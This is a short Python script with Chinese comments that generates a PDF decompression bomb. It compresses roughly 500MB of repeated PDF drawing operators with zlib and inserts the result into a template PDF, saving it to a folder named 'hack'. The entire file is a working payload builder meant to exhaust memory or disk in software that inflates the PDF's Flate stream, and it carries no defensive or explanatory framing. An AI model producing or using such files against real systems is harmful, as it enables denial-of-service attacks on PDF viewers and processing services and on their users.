import zlib

# 构造解压后 500MB 的重复数据（压缩后只有几百KB）
data = b"0 0 1 1 re f\n" * (500 * 1024 * 1024 // 16)
compressed = zlib.compress(data, level=9)

print(f"压缩前: {len(data)} 字节")
print(f"压缩后: {len(compressed)} 字节")
# 把 compressed 写入 stream 区域
# save compressed into E:\hack\Flate-zip-boom.pdf, replace the '[abcde]' with compressed
with open("Flate-zip-boom-before.pdf", "rb") as f:
    content = f.read()
    content = content.replace(b"[abcde]", compressed)
with open("E:\hack\Flate-zip-boom.pdf", "wb") as f:
    f.write(content)
